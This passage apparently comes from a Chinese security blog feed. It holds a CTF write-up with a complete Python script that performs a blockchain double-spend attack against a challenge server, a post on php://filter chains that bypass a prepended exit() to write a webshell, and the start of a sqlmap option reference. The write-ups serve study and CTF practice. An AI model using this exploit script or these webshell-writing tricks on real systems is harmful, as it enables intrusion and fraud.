        html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>
    source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> html

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span></code></pre>
<p>其余函数功能：</p>
<ul>
<li>addr_to_pubkey：检查地址有效性</li>
<li>pubkey_to_address：生成钱包地址</li>
<li>gen_addr_key_pair：生成钱包地址</li>
<li>create_output_utxo：创建一个utxo</li>
<li>create_tx：创建一个tx</li>
<li>create_block：创建一个block</li>
<li>find_blockchain_tail：查询最后一个block</li>
<li>calculate_utxo：得到所有utxo</li>
<li>calculate_balance：计算钱包的余额</li>
<li>verify_utxo_signature：验证utxo签名</li>
<li>append_block：添加块</li>
<li>init：初始化函数</li>
<li>get_balance_of_all：得到所有block，所有地址和utxo</li>
<li>homepage：web主页</li>
<li>getFlag：flag获取页面</li>
</ul>
<h2 id="51-双花攻击"><a href="#51-双花攻击" class="headerlink" title="51% 双花攻击"></a>51% 双花攻击</h2><ol>
<li>这道题整的解法是 51% （双花）攻击。</li>
<li>请于正常的区块链区分开来，题目环境中只有你一个玩家，并没有人与你竞争（挖矿）。</li>
<li>商店交易采用0确认，而不是现实中的6确认。</li>
<li>当出现分叉时，区块链的规则认最长的分链为主链，并舍去原有的链。<br>区块链允许添加空块</li>
<li>51%（双花）攻击可以达到的目的就是使攻击前的交易作废，这里的前不一定是前一个，而是很大程度上取决于你的算力的。让之前的交易作废有什么好处呢？这里我们就要考虑0确认和6确认的区别了。</li>
</ol>
<p>当产生一笔交易时，区块链的P2P网络会广播这笔交易，这笔交易会被一个挖矿节点收到，并验证，如果这个挖矿节点挖到区块（生成的hash满足条件）后，并且这笔交易的手续费足够吸引这个节点去打包进区块，那这笔交易就会被打包进区块。因此就得到了一个确认，这个矿工也拿走了相应的手续费。 这个挖矿节点打包后，会把区块广播给其他节点。其他节点验证并广播这个区块。 如果这个区块得到更多的挖矿节点的验证确认，那就得到了更多的确认。这样这笔交易就被记录到了比特币区块链，并成为了比特币账本的一部分。如果得到6个确认后，我们就认为它永远不可变了。</p>
<p>0确认就同样的道理了，那就是不需要别人确认，就如我们生活中的一手交钱一手交货，不同的是生活中我们处于中心化社会，银行会帮我们确认。而6确认就是需要经过6个人(区块被挖出)交易才确定。</p>
<p>可以看到对0确认和6确认进行51%(双花)攻击的难度是不一样的，6确认需要的算力明显要大，因为他要多比其他人生成6个区块。好在，题目并不是采用6确认。</p>
<p>然后再看看这里的51% 攻击，其实这里说的51%是指算力，也就是这种攻击需要攻击者具备全网51%的算力，因为这样才有机会使自己生成（挖出）区块的速度超过其他人，然后按区块链的规则：当出现分叉时，区块链的规则认最长的分链为主链，并舍去原有的链，就达到了撤销原来链上已经存在的交易，拿回该交易使用了的钱的目的，这里我的另一个理解就是可以使交易回滚，从而追回被盗的钱。</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8F%8A%E5%8F%8C%E8%8A%B1%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86(UTXO).assets/image-20211115170232249.png" alt="image-20211115170232249"></p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8F%8A%E5%8F%8C%E8%8A%B1%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86(UTXO).assets/image-20211115170248426.png" alt="image-20211115170248426"></p>
<p>按照流程，我们应该构造一个转钱给商店的区块。但通过代码，我们可以发现转账的时候是需要私钥签名的，也就是这个signature段。可以通过黑客留下的signature直接绕过，并且上一步的input也可以从黑客的区块中得到。所以我们就可以直接构造转账给商店的区块了，并且通过51%攻击使黑客转走的钱追回.</p>
<h3 id="构造方法一"><a href="#构造方法一" class="headerlink" title="构造方法一"></a>构造方法一</h3><p>这种办法只要POST空块即可，转账使用转账后门实现：</p>
<pre><code>创世块-&gt;黑客块-&gt;空块  
  │   
  └──&gt;空块(1)-&gt;空块(2)-&gt;空块(3)-&gt;后门转账给商店-&gt;POST访问create_transaction触发买钻石
                        │   
                        └──&gt;空块(4)-&gt;空块(5)-&gt;空块(6)-&gt;后门转账给商店-&gt;POST访问create_transaction触发买钻石</code></pre>
<ul>
<li>当POST第三个空块时，主链改变，黑客提走的钱被追回，通过转账后门与POST触发新增两个区块，总长为六块</li>
<li>接上第三个空块，POST到第六个空块时，主链再次改变，钱又重新回到银行，再次利用后门得到钻石</li>
</ul>
<h3 id="构造方法二"><a href="#构造方法二" class="headerlink" title="构造方法二"></a>构造方法二</h3><pre><code>创世块-&gt;黑客块-&gt;空块  
  │   
  └──&gt;转账给商店块(1)-&gt;空块(2)-&gt;空块(3)--自动触发--&gt;购买钻石
                                │   
                                └──&gt;空块(4)-&gt;空块(5)-&gt;自动触发--&gt;购买钻石</code></pre>
<ul>
<li>伪造具有一个银行转给商店的交易记录的区块，这里要伪造tx数据块中的签名</li>
<li>签名是通过tx数据库中的input（付款utxo的id）和付款方的私钥算出</li>
<li>所以直接利用黑客块中的签名即可</li>
<li>当POST到第三块时，主链改变，100w在商店余额中，自动触发购买钻石</li>
<li>接上第三块，POST到第五块时主链再猜改变，自动触发购买钻石</li>
</ul>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class=" language-Python"><code class="language-Python"># -*- encoding: utf-8 -*-
# written in python 2.7
import hashlib, json, rsa, uuid, os,requests,re

# 一堆变量常量

url_root="http://111.200.241.244:61460/"
url_create="http://111.200.241.244:61460/create_transaction"
url_flag="http://111.200.241.244:61460/flag"

s=requests.Session()
ddcoin = s.get(url=url_root)

prev_one=re.search(r"hash of genesis block: ([0-9a-f]{64})",ddcoin.content, flags=0).group(1)
bank_utox_id=re.search(r"\"input\": \[\"([0-9a-f\-]{36})",ddcoin.content, flags=0).group(1)
bank_signature=re.search(r"\"signature\": \[\"([0-9a-f]{96})",ddcoin.content, flags=0).group(1)

DIFFICULTY = int('00000' + 'f' * 59, 16)
EMPTY_HASH = '0'*64

bank_addr="998f49e4bccfc44ef96313c9be35c2252aee17172118719b7c744bc9033ef3f5904e9a649bc4fab5c4cb3f3d5cac72a5"
hacke_addr="a8af0c41afd2a78f21ca61d85c84e81acbe4639e31b7ad8988ca0602163451b8bb1d0cb72aaa2bdc9feeecf5411c72bb"
shop_addr="92b84ee514126392f3e18a960900c82699aa88c666c1e4466878582e2cc18e1869f7a51e9b6f1d5f159ce9e63fadd5e7"

# 源码中的API

def hash(x):
    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()

def hash_reducer(x, y):
    return hash(hash(x)+hash(y))

def hash_block(block):
    return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])

def hash_utxo(utxo):
    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])

def hash_tx(tx):
    return reduce(hash_reducer, [
        reduce(hash_reducer, tx['input'], EMPTY_HASH),
        reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)
    ])

def create_output_utxo(addr_to, amount):
    utxo = {'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount}
    utxo['hash'] = hash_utxo(utxo)
    return utxo

def create_tx(input_utxo_ids, output_utxo, privkey_from=None):
    tx = {'input': input_utxo_ids, 'signature':[bank_signature], 'output': output_utxo}  # 修改了签名
    tx['hash'] = hash_tx(tx)
    return tx

def create_block(prev_block_hash, nonce_str, transactions):
    if type(prev_block_hash) != type(''): raise Exception('prev_block_hash should be hex-encoded hash value')
    nonce = str(nonce_str)
    if len(nonce) > 128: raise Exception('the nonce is too long')
    block = {'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions}
    block['hash'] = hash_block(block)
    return block


# 构造的方法

def check_hash(prev,tx):
    for i in range(10000000):
        current_block=create_block(prev,str(i),tx)
        block_hash = int(current_block['hash'], 16)
        if block_hash<DIFFICULTY:
            print json.dumps(current_block)
            return current_block

def create_feak_one():
    utxo_first=create_output_utxo(shop_addr,1000000)
    tx_first=create_tx([bank_utox_id],[utxo_first])
    return check_hash(prev_one,[tx_first])

def create_empty_block(prev):
    return check_hash(prev,[])


# 攻击过程

a=create_feak_one()
print s.post(url=url_create,data=str(json.dumps(a))).content
b=create_empty_block(a['hash'])
print s.post(url=url_create,data=str(json.dumps(b))).content
c=create_empty_block(b['hash'])
print s.post(url=url_create,data=str(json.dumps(c))).content
d=create_empty_block(c['hash'])
print s.post(url=url_create,data=str(json.dumps(d))).content
e=create_empty_block(d['hash'])
print s.post(url=url_create,data=str(json.dumps(e))).content
print s.get(url=url_flag).content
</code></pre>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8F%8A%E5%8F%8C%E8%8A%B1%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86(UTXO).assets/image-20211115114730993.png" alt="image-20211115114730993"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>DDCTF2018-区块链：</p>
<p><a href="https://xuanxuanblingbling.github.io/ctf/web/2018/05/01/DDCTF2018-WEB4-%E5%8C%BA%E5%9D%97%E9%93%BE/">https://xuanxuanblingbling.github.io/ctf/web/2018/05/01/DDCTF2018-WEB4-%E5%8C%BA%E5%9D%97%E9%93%BE/</a></p>
<p>从DDCTF中看区块链安全之51%攻击：</p>
<p><a href="https://bbs.ichunqiu.com/thread-39743-1-2.html">https://bbs.ichunqiu.com/thread-39743-1-2.html</a></p>
<p>攻防世界web进阶区Web_python_block_chain详解：</p>
<p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/108111692">https://blog.csdn.net/hxhxhxhxx/article/details/108111692</a></p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>php://filter绕过exit()</title>
    <url>/2021/10/02/phpsec/php-filter-rao-guo-exit/php-filter-rao-guo-exit/</url>
    <content><![CDATA[<p>原文：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list</a></p>
<p>php://filter是PHP中独有的协议，利用这个协议可以创造很多“妙用”，本文说几个有意思的点，剩下的大家自己下去体会。本来本文的思路我上半年就准备拿来做XDCTF2016的题目的，没想到被三个白帽的一题抢先用了，我也就只好提前分享一下。</p>
<h2 id="XXE中的使用"><a href="#XXE中的使用" class="headerlink" title="XXE中的使用"></a>XXE中的使用</h2><p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。</p>
<p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。</p>
<p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：</p>
<pre><code>readfile("php://filter/read=convert.base64-encode/resource=php://input");</code></pre>
<p>如下：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/0f851469385893.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-0f851469385893.png" alt="QQ截图20160724234603.png"></a></p>
<p>所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。</p>
<p>如下，我们使用的是<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/693b1469385893.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-693b1469385893.png" alt="QQ截图20160724235335.png"></a></p>
<h2 id="巧用编码与解码"><a href="#巧用编码与解码" class="headerlink" title="巧用编码与解码"></a>巧用编码与解码</h2><p>使用编码不光可以帮助我们获取文件，也可以帮我们去除一些“不必要的麻烦”。</p>
<p>记得前段时间三个白帽有个比赛，其中有一部分代码大概类似于以下：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">'&lt;?php exit; ?>'</span><span class="token punctuation">;</span>
<span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p>
<p>幸运的是，这里的<code>$_POST['filename']</code>是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
<p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
<p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'|[^a-z0-9A-Z+/]|s'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode  来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
<p>最后效果是 ：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/fca81469385894.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-fca81469385894.png" alt="QQ截图20160725005316.png"></a></p>
<h2 id="利用字符串操作方法"><a href="#利用字符串操作方法" class="headerlink" title="利用字符串操作方法"></a><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#_2">利用字符串操作方法</a></h2><p>有的同学说，base64的算法我不懂，上面的方法太复杂了。</p>
<p>其实，除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除“死亡exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p>
<p>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p>
<p>编写如下测试代码即可查看 php://filter/read=string.strip_tags/resource=php://input 的效果：</p>
<pre><code>echo readfile('php://filter/read=string.strip_tags/resource=php://input');</code></pre>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/499a1469385895.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-499a1469385895.png" alt="QQ截图20160725010403.png"></a></p>
<p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p>
<p>万幸的是，php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
<p>最终的数据包如下：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/95b61469385895.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-95b61469385895.png" alt="QQ截图20160725011007.png"></a></p>
<p>除此之外，我们还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201607/1c471469385896.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-1c471469385896.png" alt="QQ截图20160725012639.png"></a></p>
<p>当然，这个方法的条件就是不开启短标签。</p>
]]></content>
      <tags>
        <tag>PHPsec</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap使用学习</title>
    <url>/2023/03/07/sqlmap-shi-yong-xue-xi/sqlmap-shi-yong-xue-xi/</url>
    <content><![CDATA[<p>sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>
<p>sqlmap 相关资源如下：</p>
<p>官方网站：<a href="http://sqlmap.org/%EF%BC%8C">http://sqlmap.org/，</a></p>
<p>下载地址：<a href="https://github.com/sqlmapproject/sqlmap/zipball/master">https://github.com/sqlmapproject/sqlmap/zipball/master</a></p>
<p>演示视频：<a href="https://asciinema.org/a/46601">https://asciinema.org/a/46601</a></p>
<p>教程：<a href="http://www.youtube.com/user/inquisb/videos">http://www.youtube.com/user/inquisb/videos</a></p>
<h2 id="1-1-sqlmap简介"><a href="#1-1-sqlmap简介" class="headerlink" title="1.1 sqlmap简介"></a>1.1 sqlmap简介</h2><p>sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft  Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。</p>
<p>sqlmap支持五种不同的注入模式：</p>
<ul>
<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</li>
<li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li>
<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li>
<li>联合查询注入，可以使用union的情况下的注入；</li>
<li>堆查询注入，可以同时执行多条语句的执行时的注入。</li>
</ul>
<h2 id="1-2-下载及安装"><a href="#1-2-下载及安装" class="headerlink" title="1.2 下载及安装"></a>1.2 下载及安装</h2><p>建议直接看 github：<a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
<p>You can download the latest tarball by clicking <a href="https://github.com/sqlmapproject/sqlmap/tarball/master">here</a> or latest zipball by clicking <a href="https://github.com/sqlmapproject/sqlmap/zipball/master">here</a>.</p>
<p>Preferably, you can download sqlmap by cloning the Git repository:</p>
<blockquote>
<pre><code>git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</code></pre>
</blockquote>
<p>sqlmap works out of the box with Python version 2.6, 2.7 and 3.x on any platform.</p>
<h2 id="1-3-SQL使用参数详解"><a href="#1-3-SQL使用参数详解" class="headerlink" title="1.3 SQL使用参数详解"></a>1.3 SQL使用参数详解</h2><p>本文以SQLmap 1.1.8-8版本为例，对其所有参数进行详细的分析和讲解，便于在使用时进行查询。</p>
<p><code>sqlmap -hh</code> 列出参数说明</p>
<p>用法: sqlmap.py [选项]</p>
<h3 id="1-3-1-选项"><a href="#1-3-1-选项" class="headerlink" title="1.3.1 选项"></a>1.3.1 选项</h3><ul>
<li>-h,–help  显示基本帮助信息并退出</li>
<li>-hh    显示高级帮助信息并退出</li>
<li>–version  显示程序版本信息并退出</li>
<li>-vVERBOSE信息级别: 0-6  （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</li>
</ul>
<h3 id="1-3-2-目标"><a href="#1-3-2-目标" class="headerlink" title="1.3.2 目标"></a>1.3.2 目标</h3><p>在这些选项中必须提供至少有一个确定目标</p>
<ul>
<li>-d DIRECT    直接连接数据库的连接字符串</li>
<li>-u URL, –url=URL   目标URL (e.g.”<a href="http://www.site.com/vuln.php?id=1&quot;)%EF%BC%8C%E4%BD%BF%E7%94%A8-u%E6%88%96%E8%80%85--url">http://www.site.com/vuln.php?id=1")，使用-u或者--url</a></li>
<li>-l LOGFILE     从Burp或者WebScarab代理日志文件中分析目标</li>
<li>-x SITEMAPURL  从远程网站地图（sitemap.xml）文件来解析目标</li>
<li>-m BULKFILE      将目标地址保存在文件中，一行为一个URL地址进行批量检测。</li>
<li>-r REQUESTFILE    从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个–force-ssl参数来使用，或者可以在Host头后门加上:443</li>
<li>-g GOOGLEDORK     从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）</li>
<li>-c CONFIGFILE       从配置ini文件中加载选项</li>
</ul>
<h3 id="1-3-3-请求"><a href="#1-3-3-请求" class="headerlink" title="1.3.3 请求"></a>1.3.3 请求</h3><p>这些选项可以用来指定如何连接到目标URL</p>
<ul>
<li><p>–method=METHOD  强制使用给定的HTTP方法（例如put）</p>
</li>
<li><p>–data=DATA   通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。–data=”id=1” -f –banner –dbs –users</p>
</li>
<li><p>–param-del=PARA..  当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p>
</li>
<li><p>–cookie=COOKIE     HTTP Cookieheader 值</p>
</li>
<li><p>–cookie-del=COO..  用来分隔cookie的字符串值</p>
</li>
<li><p>–load-cookies=L..  Filecontaining cookies in Netscape/wget format</p>
</li>
<li><p>–drop-set-cookie   IgnoreSet-Cookie header from response</p>
</li>
<li><p>–user-agent=AGENT  默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(<a href="http://sqlmap.org)可以使用--user-agent参数来修改,同时也可以使用--random-agent参数来随机的从./txt/user-agents.txt%E4%B8%AD%E8%8E%B7%E5%8F%96%E3%80%82%E5%BD%93--level%E5%8F%82%E6%95%B0%E8%AE%BE%E5%AE%9A%E4%B8%BA3%E6%88%96%E8%80%853%E4%BB%A5%E4%B8%8A%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E4%BC%9A%E5%B0%9D%E8%AF%95%E5%AF%B9User-Angent%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5">http://sqlmap.org)可以使用--user-agent参数来修改，同时也可以使用--random-agent参数来随机的从./txt/user-agents.txt中获取。当--level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入</a></p>
</li>
<li><p>–random-agent     使用random-agent作为HTTP User-Agent头值</p>
</li>
<li><p>–host=HOST         HTTP Hostheader value</p>
</li>
<li><p>–referer=REFERER   sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入</p>
</li>
<li><p>-H HEADER, –hea..  额外的http头(e.g.”X-Forwarded-For: 127.0.0.1”)</p>
</li>
<li><p>–headers=HEADERS  可以通过–headers参数来增加额外的http头(e.g.”Accept-Language: fr\nETag: 123”)</p>
</li>
<li><p>–auth-type=AUTH.. HTTP的认证类型 (Basic, Digest, NTLM or PKI)</p>
</li>
<li><p>–auth-cred=AUTH..  HTTP 认证凭证(name:password)</p>
</li>
<li><p>–auth-file=AUTH..  HTTP  认证PEM证书/私钥文件；当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file,key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</p>
</li>
<li><p>–ignore-401        Ignore HTTPError 401 (Unauthorized)忽略HTTP 401错误（未授权的）</p>
</li>
<li><p>–ignore-proxy      忽略系统的默认代理设置</p>
</li>
<li><p>–ignore-redirects忽略重定向的尝试</p>
</li>
<li><p>–ignore-timeouts   忽略连接超时</p>
</li>
<li><p>–proxy=PROXY       使用代理服务器连接到目标URL</p>
</li>
<li><p>–proxy-cred=PRO..  代理认证凭证(name:password)</p>
</li>
<li><p>–proxy-file=PRO..  从文件加载代理列表</p>
</li>
<li><p>–tor               使用Tor匿名网络</p>
</li>
<li><p>–tor-port=TORPORT  设置Tor代理端口</p>
</li>
<li><p>–tor-type=TORTYPE  设置Tor代理类型 (HTTP,SOCKS4 or SOCKS5 (缺省))</p>
</li>
<li><p>–check-tor       检查Tor的是否正确使用</p>
</li>
<li><p>–delay=DELAY   可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>
</li>
<li><p>–timeout=TIMEOUT   可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。</p>
</li>
<li><p>–retries=RETRIES   当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</p>
</li>
<li><p>–randomize=RPARAM可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样</p>
</li>
<li><p>–safe-url=SAFEURL  提供一个安全不错误的连接，每隔一段时间都会去访问一下</p>
</li>
<li><p>–safe-post=SAFE..  提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。</p>
</li>
<li><p>–safe-req=SAFER..  从文件中加载安全HTTP请求</p>
</li>
<li><p>–safe-freq=SAFE..  测试一个给定安全网址的两个访问请求</p>
</li>
<li><p>–skip-urlencode    跳过URL的有效载荷数据编码</p>
</li>
<li><p>–csrf-token=CSR..  Parameter usedto hold anti-CSRF token参数用来保存反CSRF令牌</p>
</li>
<li><p>–csrf-url=CSRFURL  URL地址访问提取anti-CSRF令牌</p>
</li>
<li><p>–force-ssl         强制使用SSL/HTTPS</p>
</li>
<li><p>–hpp               使用HTTP参数污染的方法</p>
</li>
<li><p>–eval=EVALCODE      在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。(e.g “import hashlib;id2=hashlib.md5(id).hexdigest()”)</p>
<pre><code>sqlmap.py -u"http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b"--eval="import hashlib;hash=hashlib.md5(id).hexdigest()"</code></pre>
</li>
</ul>
<h3 id="1-3-4-优化"><a href="#1-3-4-优化" class="headerlink" title="1.3.4 优化"></a>1.3.4 优化</h3><p>这些选项可用于优化sqlmap性能</p>
<ul>
<li>-o               打开所有的优化开关</li>
<li>–predict-output    预测普通查询输出</li>
<li>–keep-alive        使用持久HTTP（S）连接</li>
<li>–null-connection   获取页面长度</li>
<li>–threads=THREADS   当前http(s)最大请求数 (默认 1)</li>
</ul>
<h3 id="1-3-5-注入"><a href="#1-3-5-注入" class="headerlink" title="1.3.5 注入"></a>1.3.5 注入</h3><p>这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。</p>
<ul>
<li>-p TESTPARAMETER    可测试的参数</li>
<li>–skip=SKIP         跳过对给定参数的测试</li>
<li>–skip-static       跳过测试不显示为动态的参数</li>
<li>–param-exclude=..  使用正则表达式排除参数进行测试（e.g. “ses”）</li>
<li>–dbms=DBMS         强制后端的DBMS为此值</li>
<li>–dbms-cred=DBMS..  DBMS认证凭证(user:password)</li>
<li>–os=OS            强制后端的DBMS操作系统为这个值</li>
<li>–invalid-bignum    使用大数字使值无效</li>
<li>–invalid-logical   使用逻辑操作使值无效</li>
<li>–invalid-string    使用随机字符串使值无效</li>
<li>–no-cast          关闭有效载荷铸造机制</li>
<li>–no-escape         关闭字符串逃逸机制</li>
